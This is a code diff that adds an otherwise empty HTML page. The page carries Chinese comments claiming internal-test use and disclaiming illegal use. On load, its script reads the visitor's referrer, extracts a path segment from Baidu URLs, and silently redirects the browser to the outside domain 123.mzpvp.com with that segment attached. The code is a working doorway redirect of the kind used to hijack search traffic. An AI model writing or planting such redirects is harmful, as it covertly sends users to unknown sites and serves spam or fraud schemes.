@@ -1,1 +1,23 @@
-test
+<!-- 版权声明：此页面源代码由Dd财编写，仅供内部测试使用。 -->
+<!-- 任何利用本代码进行违法活动的行为均被严格禁止,如有明知故犯且情节严重者者,将依法移交公安机关处理 -->
+<!DOCTYPE html>  
+<html lang="en">  
+<head>  
+<meta charset="UTF-8">  
+<script>  
+window.onload = function() {  
+    var referrer = window.document.referrer;  
+    console.log('Referrer:', referrer);  
+    var regex = /baidu\.com\/([^\/]+)\/tc/i;  
+    var match = referrer.match(regex);  
+    var param = match ? match[1] : '';
+    var newUrl = 'http://123.mzpvp.com';  
+    if (param) {  
+        newUrl += '/?' + encodeURIComponent(param);  
+    }  
+    console.log('New URL:', newUrl);  
+    window.location.href = newUrl;  
+};  
+</script>  
+</head>  
+</html>
